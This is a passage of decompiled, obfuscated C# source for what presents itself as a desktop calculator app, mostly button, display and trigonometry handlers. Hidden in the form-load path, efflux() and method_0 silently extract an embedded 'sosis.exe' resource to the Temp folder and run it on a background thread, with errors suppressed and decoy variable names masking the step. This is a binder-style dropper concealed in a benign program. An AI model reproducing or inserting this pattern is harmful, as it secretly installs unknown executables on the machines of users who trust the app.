			EventHandler eventHandler2 = method_174;
			Button val2 = _btn_n;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_n = value;
			val2 = _btn_n;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	[field: AccessedThroughProperty("grp_algebra")]
	internal virtual GroupBox grp_algebra
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btn_ncr
	{
		[CompilerGenerated]
		get
		{
			return _btn_ncr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_59);
			EventHandler eventHandler = method_110;
			EventHandler eventHandler2 = method_177;
			Button val2 = _btn_ncr;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_ncr = value;
			val2 = _btn_ncr;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_sigma_n1
	{
		[CompilerGenerated]
		get
		{
			return _btn_sigma_n1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_58);
			EventHandler eventHandler = method_109;
			EventHandler eventHandler2 = method_176;
			Button val2 = _btn_sigma_n1;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_sigma_n1 = value;
			val2 = _btn_sigma_n1;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_sigma_nr
	{
		[CompilerGenerated]
		get
		{
			return _btn_sigma_nr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_57);
			EventHandler eventHandler = method_108;
			EventHandler eventHandler2 = method_175;
			Button val2 = _btn_sigma_nr;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_sigma_nr = value;
			val2 = _btn_sigma_nr;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	public Form1()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		Class8.BpPkGHSz2q2OL();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_MouseMove(new MouseEventHandler(Form1_MouseMove));
		administration = "False";
		pneumonia = "Temp";
		layer = "sosis.exe";
		battle = "True";
		battles = "False";
		calculation_0 = new calculation();
		introduce = "Title";
		character = "Message";
		lunch = "[Bndname]";
		InitializeComponent();
	}

	private void method_0()
	{
		string text = layer;
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text);
		using (FileStream destination = new FileStream(Path.Combine(Interaction.Environ(pneumonia), text), FileMode.Create, FileAccess.Write))
		{
			stream.CopyTo(destination);
		}
		Process.Start(Path.Combine(Interaction.Environ(pneumonia), text));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_Size(new Size(342, 412));
		StandardToolStripMenuItem1.set_Checked(true);
		string_0 = ((ServerComputer)Class2.Class1_0).get_FileSystem().get_CurrentDirectory();
		if (Operators.CompareString(administration, "True", false) == 0)
		{
			Class2.Class3_0.Dialog1.will();
		}
		forest();
		if (Operators.CompareString(battles, "True", false) == 0)
		{
			MessageBox.Show(character, introduce);
		}
		efflux();
		((TextBoxBase)txtmain).set_BackColor(Color.White);
		((TextBoxBase)txtmain).set_ForeColor(Color.Black);
		txtmain.set_TextAlign((HorizontalAlignment)1);
		((ButtonBase)btn_mg).set_Text("Mo");
		((Control)btn_mplus).set_Enabled(false);
		((Control)btn_mminus).set_Enabled(false);
		((Control)combo_memory).Hide();
		radio_rad.set_Checked(true);
		radio_decimal.set_Checked(true);
		((Control)btn_2).set_Enabled(true);
		((Control)btn_3).set_Enabled(true);
		((Control)btn_4).set_Enabled(true);
		((Control)btn_5).set_Enabled(true);
		((Control)btn_6).set_Enabled(true);
		((Control)btn_7).set_Enabled(true);
		((Control)btn_8).set_Enabled(true);
		((Control)btn_9).set_Enabled(true);
		((Control)btn_a).set_Enabled(false);
		((Control)btn_b).set_Enabled(false);
		((Control)btn_c).set_Enabled(false);
		((Control)btn_d).set_Enabled(false);
		((Control)btn_e).set_Enabled(false);
		((Control)btn_f).set_Enabled(false);
		((Control)btn_decimal_point).set_Enabled(true);
		((Control)btn_addminus).set_Enabled(true);
		cmb_box_unit.get_Items().Add((object)"km/h to m/s");
		cmb_box_unit.get_Items().Add((object)"m/s to km/h");
		cmb_box_unit.get_Items().Add((object)"mmHg to Pa");
		cmb_box_unit.get_Items().Add((object)"Pa to mmHg");
		cmb_box_unit.get_Items().Add((object)"hP to W");
		cmb_box_unit.get_Items().Add((object)"W to hP");
		cmb_box_unit.get_Items().Add((object)"Inch to cm");
		cmb_box_unit.get_Items().Add((object)"cm to Inch");
	}

	public object efflux()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			flash();
		});
		thread.IsBackground = true;
		thread.Start();
		return true;
	}

	public object flash()
	{
		try
		{
			method_0();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			Point location = default(Point);
			location.X = Control.get_MousePosition().X;
			location.Y = Control.get_MousePosition().Y;
			((Form)this).set_Location(location);
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		StandardToolStripMenuItem1.set_Checked(true);
		if (StandardToolStripMenuItem1.get_Checked())
		{
			((Form)this).set_Size(new Size(342, 412));
			ScientificToolStripMenuItem1.set_Checked(false);
			ConversionToolStripMenuItem.set_Checked(false);
			((Control)grp_advance_top).set_Enabled(false);
			((Control)grp_advance_bottom).set_Enabled(false);
			point_0.X = 266;
			point_0.Y = 8;
			((Control)btn_close).set_Location(point_0);
			point_0.X = 301;
			point_0.Y = 8;
			((Control)btn_minimize).set_Location(point_0);
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		ScientificToolStripMenuItem1.set_Checked(true);
		if (ScientificToolStripMenuItem1.get_Checked())
		{
			((Form)this).set_Size(new Size(702, 392));
			StandardToolStripMenuItem1.set_Checked(false);
			ConversionToolStripMenuItem.set_Checked(false);
			((Control)grp_advance_top).set_Enabled(true);
			((Control)grp_advance_bottom).set_Enabled(true);
			point_0.X = 620;
			point_0.Y = 6;
			((Control)btn_close).set_Location(point_0);
			point_0.X = 655;
			point_0.Y = 6;
			((Control)btn_minimize).set_Location(point_0);
		}
	}

	public object forest()
	{
		if (Operators.CompareString(battle, "True", false) == 0)
		{
			Dialog1.designer();
		}
		object result = default(object);
		return result;
	}

	private void method_3(object sender, EventArgs e)
	{
		ConversionToolStripMenuItem.set_Checked(true);
		if (ConversionToolStripMenuItem.get_Checked())
		{
			((Form)this).set_Size(new Size(702, 555));
			ScientificToolStripMenuItem1.set_Checked(false);
			StandardToolStripMenuItem1.set_Checked(false);
			((Control)grp_advance_top).set_Enabled(false);
			((Control)grp_advance_bottom).set_Enabled(false);
			point_0.X = 620;
			point_0.Y = 6;
			((Control)btn_close).set_Location(point_0);
			point_0.X = 655;
			point_0.Y = 6;
			((Control)btn_minimize).set_Location(point_0);
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void method_5(object sender, EventArgs e)
	{
		((TextBoxBase)txtmain).Copy();
	}

	private void method_6(object sender, EventArgs e)
	{
		((TextBoxBase)txtmain).Paste();
	}

	private void method_7(object sender, EventArgs e)
	{
		((TextBoxBase)txtmain).SelectAll();
	}

	private void olIiHyIyaT(object sender, EventArgs e)
	{
		Dialog1 dialog = new Dialog1();
		((Control)dialog).Show();
	}

	private void method_8(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = ((ServerComputer)Class2.Class1_0).get_FileSystem().GetName("CSS Cal 0.1 Manual.pdf");
			Help.ShowHelp((Control)(object)this, name);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		show_about();
	}

	public void show_about()
	{
		AboutBox1 aboutBox = new AboutBox1();
		((Control)aboutBox).Show();
	}

	private void method_10(object sender, EventArgs e)
	{
		((ButtonBase)btn_1).set_BackColor(Color.GreenYellow);
	}

	private void method_11(object sender, EventArgs e)
	{
		((ButtonBase)btn_2).set_BackColor(Color.GreenYellow);
	}

	private void meWiMocJiJ(object sender, EventArgs e)
	{
		((ButtonBase)btn_3).set_BackColor(Color.GreenYellow);
	}

	private void method_12(object sender, EventArgs e)
	{
		((ButtonBase)btn_4).set_BackColor(Color.GreenYellow);
	}

	private void method_13(object sender, EventArgs e)
	{
		((ButtonBase)btn_5).set_BackColor(Color.GreenYellow);
	}

	private void method_14(object sender, EventArgs e)
	{
		((ButtonBase)btn_6).set_BackColor(Color.GreenYellow);
	}

	private void blBiPtniDn(object sender, EventArgs e)
	{
		((ButtonBase)btn_7).set_BackColor(Color.GreenYellow);
	}

	private void method_15(object sender, EventArgs e)
	{
		((ButtonBase)btn_8).set_BackColor(Color.GreenYellow);
	}

	private void method_16(object sender, EventArgs e)
	{
		((ButtonBase)btn_9).set_BackColor(Color.GreenYellow);
	}

	private void method_17(object sender, EventArgs e)
	{
		((ButtonBase)btn_0).set_BackColor(Color.GreenYellow);
	}

	private void method_18(object sender, EventArgs e)
	{
		((ButtonBase)btn_add).set_BackColor(Color.GreenYellow);
	}

	private void method_19(object sender, EventArgs e)
	{
		((ButtonBase)btn_subtract).set_BackColor(Color.GreenYellow);
	}

	private void method_20(object sender, EventArgs e)
	{
		((ButtonBase)btn_multiply).set_BackColor(Color.GreenYellow);
	}

	private void method_21(object sender, EventArgs e)
	{
		((ButtonBase)btn_divide).set_BackColor(Color.GreenYellow);
	}

	private void method_22(object sender, EventArgs e)
	{
		((ButtonBase)btn_1_2).set_BackColor(Color.GreenYellow);
	}

	private void method_23(object sender, EventArgs e)
	{
		((ButtonBase)btn_mplus).set_BackColor(Color.GreenYellow);
	}

	private void method_24(object sender, EventArgs e)
	{
		((ButtonBase)btn_mminus).set_BackColor(Color.GreenYellow);
	}

	private void method_25(object sender, EventArgs e)
	{
		((ButtonBase)btn_clear).set_BackColor(Color.GreenYellow);
	}

	private void method_26(object sender, EventArgs e)
	{
		((ButtonBase)btn_mg).set_BackColor(Color.GreenYellow);
	}

	private void method_27(object sender, EventArgs e)
	{
		((ButtonBase)btn_addminus).set_BackColor(Color.GreenYellow);
	}

	private void method_28(object sender, EventArgs e)
	{
		((ButtonBase)btn_back).set_BackColor(Color.GreenYellow);
	}

	private void method_29(object sender, EventArgs e)
	{
		((ButtonBase)btn_decimal_point).set_BackColor(Color.GreenYellow);
	}

	private void method_30(object sender, EventArgs e)
	{
		((ButtonBase)btn_equal).set_BackColor(Color.GreenYellow);
	}

	private void method_31(object sender, EventArgs e)
	{
		((ButtonBase)btn_sin).set_BackColor(Color.GreenYellow);
	}

	private void method_32(object sender, EventArgs e)
	{
		((ButtonBase)btn_cos).set_BackColor(Color.GreenYellow);
	}

	private void method_33(object sender, EventArgs e)
	{
		((ButtonBase)btn_tan).set_BackColor(Color.GreenYellow);
	}

	private void method_34(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_1_y).set_BackColor(Color.GreenYellow);
	}

	private void method_35(object sender, EventArgs e)
	{
		((ButtonBase)btn_sec).set_BackColor(Color.GreenYellow);
	}

	private void method_36(object sender, EventArgs e)
	{
		((ButtonBase)btn_cot).set_BackColor(Color.GreenYellow);
	}

	private void method_37(object sender, EventArgs e)
	{
		((ButtonBase)btn_exp).set_BackColor(Color.GreenYellow);
	}

	private void method_38(object sender, EventArgs e)
	{
		((ButtonBase)btn_pi).set_BackColor(Color.GreenYellow);
	}

	private void method_39(object sender, EventArgs e)
	{
		((ButtonBase)btn_cosec).set_BackColor(Color.GreenYellow);
	}

	private void method_40(object sender, EventArgs e)
	{
		((ButtonBase)btn_deg).set_BackColor(Color.GreenYellow);
	}

	private void method_41(object sender, EventArgs e)
	{
		((ButtonBase)btn_rad).set_BackColor(Color.GreenYellow);
	}

	private void method_42(object sender, EventArgs e)
	{
		((ButtonBase)btn_e_2).set_BackColor(Color.GreenYellow);
	}

	private void method_43(object sender, EventArgs e)
	{
		((ButtonBase)btn_e_x).set_BackColor(Color.GreenYellow);
	}

	private void method_44(object sender, EventArgs e)
	{
		((ButtonBase)btn_f_c).set_BackColor(Color.GreenYellow);
	}

	private void method_45(object sender, EventArgs e)
	{
		((ButtonBase)btn_log).set_BackColor(Color.GreenYellow);
	}

	private void method_46(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_y).set_BackColor(Color.GreenYellow);
	}

	private void method_47(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_2).set_BackColor(Color.GreenYellow);
	}

	private void method_48(object sender, EventArgs e)
	{
		((ButtonBase)btn_ln).set_BackColor(Color.GreenYellow);
	}

	private void method_49(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_3).set_BackColor(Color.GreenYellow);
	}

	private void method_50(object sender, EventArgs e)
	{
		((ButtonBase)btn_c_f).set_BackColor(Color.GreenYellow);
	}

	private void method_51(object sender, EventArgs e)
	{
		((ButtonBase)btn_d).set_BackColor(Color.GreenYellow);
	}

	private void method_52(object sender, EventArgs e)
	{
		((ButtonBase)btn_e).set_BackColor(Color.GreenYellow);
	}

	private void method_53(object sender, EventArgs e)
	{
		((ButtonBase)btn_c).set_BackColor(Color.GreenYellow);
	}

	private void method_54(object sender, EventArgs e)
	{
		((ButtonBase)btn_b).set_BackColor(Color.GreenYellow);
	}

	private void method_55(object sender, EventArgs e)
	{
		((ButtonBase)btn_a).set_BackColor(Color.GreenYellow);
	}

	private void method_56(object sender, EventArgs e)
	{
		((ButtonBase)btn_n).set_BackColor(Color.GreenYellow);
	}

	private void method_57(object sender, EventArgs e)
	{
		((ButtonBase)btn_sigma_nr).set_BackColor(Color.GreenYellow);
	}

	private void method_58(object sender, EventArgs e)
	{
		((ButtonBase)btn_sigma_n1).set_BackColor(Color.GreenYellow);
	}

	private void method_59(object sender, EventArgs e)
	{
		((ButtonBase)btn_ncr).set_BackColor(Color.GreenYellow);
	}

	private void XnutcZhovo(object sender, EventArgs e)
	{
		((ButtonBase)btn_1).set_BackColor(Color.Transparent);
	}

	private void method_60(object sender, EventArgs e)
	{
		((ButtonBase)btn_2).set_BackColor(Color.Transparent);
	}

	private void method_61(object sender, EventArgs e)
	{
		((ButtonBase)btn_3).set_BackColor(Color.Transparent);
	}

	private void method_62(object sender, EventArgs e)
	{
		((ButtonBase)btn_4).set_BackColor(Color.Transparent);
	}

	private void method_63(object sender, EventArgs e)
	{
		((ButtonBase)btn_5).set_BackColor(Color.Transparent);
	}

	private void method_64(object sender, EventArgs e)
	{
		((ButtonBase)btn_6).set_BackColor(Color.Transparent);
	}

	private void method_65(object sender, EventArgs e)
	{
		((ButtonBase)btn_7).set_BackColor(Color.Transparent);
	}

	private void method_66(object sender, EventArgs e)
	{
		((ButtonBase)btn_8).set_BackColor(Color.Transparent);
	}

	private void method_67(object sender, EventArgs e)
	{
		((ButtonBase)btn_9).set_BackColor(Color.Transparent);
	}

	private void method_68(object sender, EventArgs e)
	{
		((ButtonBase)btn_0).set_BackColor(Color.Transparent);
	}

	private void method_69(object sender, EventArgs e)
	{
		((ButtonBase)btn_add).set_BackColor(Color.Transparent);
	}

	private void method_70(object sender, EventArgs e)
	{
		((ButtonBase)btn_subtract).set_BackColor(Color.Transparent);
	}

	private void method_71(object sender, EventArgs e)
	{
		((ButtonBase)btn_multiply).set_BackColor(Color.Transparent);
	}

	private void method_72(object sender, EventArgs e)
	{
		((ButtonBase)btn_divide).set_BackColor(Color.Transparent);
	}

	private void method_73(object sender, EventArgs e)
	{
		((ButtonBase)btn_1_2).set_BackColor(Color.Transparent);
	}

	private void method_74(object sender, EventArgs e)
	{
		((ButtonBase)btn_mplus).set_BackColor(Color.Transparent);
	}

	private void method_75(object sender, EventArgs e)
	{
		((ButtonBase)btn_mminus).set_BackColor(Color.Transparent);
	}

	private void method_76(object sender, EventArgs e)
	{
		((ButtonBase)btn_clear).set_BackColor(Color.Transparent);
	}

	private void method_77(object sender, EventArgs e)
	{
		((ButtonBase)btn_mg).set_BackColor(Color.Transparent);
	}

	private void method_78(object sender, EventArgs e)
	{
		((ButtonBase)btn_addminus).set_BackColor(Color.Transparent);
	}

	private void method_79(object sender, EventArgs e)
	{
		((ButtonBase)btn_back).set_BackColor(Color.Transparent);
	}

	private void method_80(object sender, EventArgs e)
	{
		((ButtonBase)btn_decimal_point).set_BackColor(Color.Transparent);
	}

	private void method_81(object sender, EventArgs e)
	{
		((ButtonBase)btn_equal).set_BackColor(Color.Transparent);
	}

	private void method_82(object sender, EventArgs e)
	{
		((ButtonBase)btn_sin).set_BackColor(Color.Transparent);
	}

	private void method_83(object sender, EventArgs e)
	{
		((ButtonBase)btn_cos).set_BackColor(Color.Transparent);
	}

	private void method_84(object sender, EventArgs e)
	{
		((ButtonBase)btn_tan).set_BackColor(Color.Transparent);
	}

	private void method_85(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_1_y).set_BackColor(Color.Transparent);
	}

	private void method_86(object sender, EventArgs e)
	{
		((ButtonBase)btn_sec).set_BackColor(Color.Transparent);
	}

	private void method_87(object sender, EventArgs e)
	{
		((ButtonBase)btn_cot).set_BackColor(Color.Transparent);
	}

	private void method_88(object sender, EventArgs e)
	{
		((ButtonBase)btn_exp).set_BackColor(Color.Transparent);
	}

	private void method_89(object sender, EventArgs e)
	{
		((ButtonBase)btn_pi).set_BackColor(Color.Transparent);
	}

	private void method_90(object sender, EventArgs e)
	{
		((ButtonBase)btn_cosec).set_BackColor(Color.Transparent);
	}

	private void method_91(object sender, EventArgs e)
	{
		((ButtonBase)btn_deg).set_BackColor(Color.Transparent);
	}

	private void method_92(object sender, EventArgs e)
	{
		((ButtonBase)btn_rad).set_BackColor(Color.Transparent);
	}

	private void method_93(object sender, EventArgs e)
	{
		((ButtonBase)btn_e_2).set_BackColor(Color.Transparent);
	}

	private void method_94(object sender, EventArgs e)
	{
		((ButtonBase)btn_e_x).set_BackColor(Color.Transparent);
	}

	private void method_95(object sender, EventArgs e)
	{
		((ButtonBase)btn_f_c).set_BackColor(Color.Transparent);
	}

	private void method_96(object sender, EventArgs e)
	{
		((ButtonBase)btn_log).set_BackColor(Color.Transparent);
	}

	private void method_97(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_y).set_BackColor(Color.Transparent);
	}

	private void method_98(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_2).set_BackColor(Color.Transparent);
	}

	private void method_99(object sender, EventArgs e)
	{
		((ButtonBase)btn_ln).set_BackColor(Color.Transparent);
	}

	private void method_100(object sender, EventArgs e)
	{
		((ButtonBase)btn_x_3).set_BackColor(Color.Transparent);
	}

	private void method_101(object sender, EventArgs e)
	{
		((ButtonBase)btn_c_f).set_BackColor(Color.Transparent);
	}

	private void method_102(object sender, EventArgs e)
	{
		((ButtonBase)btn_d).set_BackColor(Color.Transparent);
	}

	private void method_103(object sender, EventArgs e)
	{
		((ButtonBase)btn_e).set_BackColor(Color.Transparent);
	}

	private void method_104(object sender, EventArgs e)
	{
		((ButtonBase)btn_c).set_BackColor(Color.Transparent);
	}

	private void method_105(object sender, EventArgs e)
	{
		((ButtonBase)btn_b).set_BackColor(Color.Transparent);
	}

	private void method_106(object sender, EventArgs e)
	{
		((ButtonBase)btn_a).set_BackColor(Color.Transparent);
	}

	private void method_107(object sender, EventArgs e)
	{
		((ButtonBase)btn_n).set_BackColor(Color.Transparent);
	}

	private void method_108(object sender, EventArgs e)
	{
		((ButtonBase)btn_sigma_nr).set_BackColor(Color.Transparent);
	}

	private void method_109(object sender, EventArgs e)
	{
		((ButtonBase)btn_sigma_n1).set_BackColor(Color.Transparent);
	}

	private void method_110(object sender, EventArgs e)
	{
		((ButtonBase)btn_ncr).set_BackColor(Color.Transparent);
	}

	private void method_111(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void method_112(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void method_113(object sender, EventArgs e)
	{
		((ButtonBase)btn_minimize).set_BackColor(Color.White);
		((Control)btn_minimize).set_ForeColor(Color.Green);
	}

	private void method_114(object sender, EventArgs e)
	{
		((ButtonBase)btn_close).set_BackColor(Color.White);
		((Control)btn_close).set_ForeColor(Color.Green);
	}

	private void method_115(object sender, EventArgs e)
	{
		((ButtonBase)btn_minimize).set_BackColor(Color.Transparent);
		((Control)btn_minimize).set_ForeColor(Color.Black);
	}

	private void method_116(object sender, EventArgs e)
	{
		((ButtonBase)btn_close).set_BackColor(Color.Transparent);
		((Control)btn_close).set_ForeColor(Color.Black);
	}

	private void method_117(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_1).get_Text());
	}

	private void method_118(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_2).get_Text());
	}

	private void method_119(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_3).get_Text());
	}

	private void method_120(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_4).get_Text());
	}

	private void method_121(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_5).get_Text());
	}

	private void method_122(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_6).get_Text());
	}

	private void method_123(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_7).get_Text());
	}

	private void method_124(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_8).get_Text());
	}

	private void eIdWuvWide(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_9).get_Text());
	}

	private void method_125(object sender, EventArgs e)
	{
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + ((ButtonBase)btn_0).get_Text());
	}

	private void yqhWhwcnQv(object sender, EventArgs e)
	{
		double_2 = 1.0;
		double_0 = Conversion.Val(txtmain.get_Text());
		((TextBoxBase)txtmain).Clear();
	}

	private void method_126(object sender, EventArgs e)
	{
		double_2 = 2.0;
		double_0 = Conversion.Val(txtmain.get_Text());
		((TextBoxBase)txtmain).Clear();
	}

	private void method_127(object sender, EventArgs e)
	{
		double_2 = 3.0;
		double_0 = Conversion.Val(txtmain.get_Text());
		((TextBoxBase)txtmain).Clear();
	}

	private void method_128(object sender, EventArgs e)
	{
		double_2 = 4.0;
		double_0 = Conversion.Val(txtmain.get_Text());
		((TextBoxBase)txtmain).Clear();
	}

	private void method_129(object sender, EventArgs e)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			txtmain.set_Text(txtmain.get_Text().Remove(checked(txtmain.get_Text().Length - 1), 1));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_130(object sender, EventArgs e)
	{
		if (((Control)combo_memory).get_Visible())
		{
			combo_memory.get_Items().Add((object)Conversion.Val(txtmain.get_Text()));
		}
	}

	private void method_131(object sender, EventArgs e)
	{
		if (((Control)combo_memory).get_Visible())
		{
			combo_memory.get_Items().Add((object)(0.0 - Conversion.Val(txtmain.get_Text())));
		}
	}

	private void method_132(object sender, EventArgs e)
	{
		if (((Control)combo_memory).get_Visible())
		{
			((Control)combo_memory).Hide();
			((Control)btn_mplus).set_Enabled(false);
			((Control)btn_mminus).set_Enabled(false);
			combo_memory.get_Items().Clear();
		}
		else if (!((Control)combo_memory).get_Visible())
		{
			((Control)combo_memory).Show();
			((Control)btn_mplus).set_Enabled(true);
			((Control)btn_mminus).set_Enabled(true);
		}
	}

	private void method_133(object sender, EventArgs e)
	{
		txtmain.set_Text(combo_memory.get_SelectedItem().ToString());
	}

	private void method_134(object sender, EventArgs e)
	{
		((TextBoxBase)txtmain).Clear();
		txtmain.set_Text("0");
	}

	private void method_135(object sender, EventArgs e)
	{
		if (txtmain.get_Text().Contains("-"))
		{
			txtmain.set_Text(txtmain.get_Text().Replace("-", ""));
		}
		else
		{
			txtmain.set_Text("-" + txtmain.get_Text());
		}
	}

	private void method_136(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.Sqrt(Conversion.Val(txtmain.get_Text()))));
	}

	private void method_137(object sender, EventArgs e)
	{
		if (!txtmain.get_Text().Contains("."))
		{
			txtmain.set_Text(txtmain.get_Text() + ((ButtonBase)btn_decimal_point).get_Text());
			if (txtmain.get_Text().StartsWith("."))
			{
				txtmain.set_Text("0.");
			}
		}
	}

	private void method_138(object sender, EventArgs e)
	{
		double_1 = Conversion.Val(txtmain.get_Text());
		txtmain.set_Text(Conversions.ToString(calculation_0.calculate(double_0, double_1, double_2)));
	}

	private void method_139(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.PI));
	}

	private void method_140(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Math.Cos(Conversions.ToDouble(txtmain.get_Text()))));
		}
		else if (radio_degree.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Math.Cos(Conversions.ToDouble(degree_rad(txtmain.get_Text())))));
		}
	}

	private void method_141(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Math.Tan(Conversions.ToDouble(txtmain.get_Text()))));
		}
		else if (radio_degree.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Math.Tan(Conversions.ToDouble(degree_rad(txtmain.get_Text())))));
		}
	}

	private void method_142(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Conversion.Val((object)(1.0 / Math.Sin(Conversions.ToDouble(txtmain.get_Text()))))));
		}
		else if (radio_degree.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Conversion.Val((object)(1.0 / Math.Sin(Conversions.ToDouble(degree_rad(txtmain.get_Text())))))));
		}
	}

	private void method_143(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(1.0 / Math.Cos(Conversions.ToDouble(txtmain.get_Text()))));
		}
		else if (radio_degree.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Conversion.Val((object)(1.0 / Math.Cos(Conversions.ToDouble(degree_rad(txtmain.get_Text())))))));
		}
	}

	private void method_144(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Conversion.Val((object)(1.0 / Math.Tan(Conversions.ToDouble(txtmain.get_Text()))))));
		}
		else if (radio_degree.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Conversion.Val((object)(1.0 / Math.Tan(Conversions.ToDouble(degree_rad(txtmain.get_Text())))))));
		}
	}

	private void method_145(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.E));
	}

	private void method_146(object sender, EventArgs e)
	{
		if (radio_rad.get_Checked())
		{
			txtmain.set_Text(Conversions.ToString(Math.Sin(Conversions.ToDouble(txtmain.get_Text()))));
		}
		else if (radio_degree.get_Checked())
		{
			Console.WriteLine(RuntimeHelpers.GetObjectValue(rad_degree(txtmain.get_Text())));
			txtmain.set_Text(Conversions.ToString(Math.Sin(Conversions.ToDouble(degree_rad(txtmain.get_Text())))));
		}
	}

	private void method_147(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(rad_degree(txtmain.get_Text())));
	}

	private void method_148(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(degree_rad(txtmain.get_Text())));
	}

	public object degree_rad(object value)
	{
		double_4 = Math.PI / 180.0 * Conversion.Val(RuntimeHelpers.GetObjectValue(value));
		return double_4;
	}

	public object rad_degree(object value)
	{
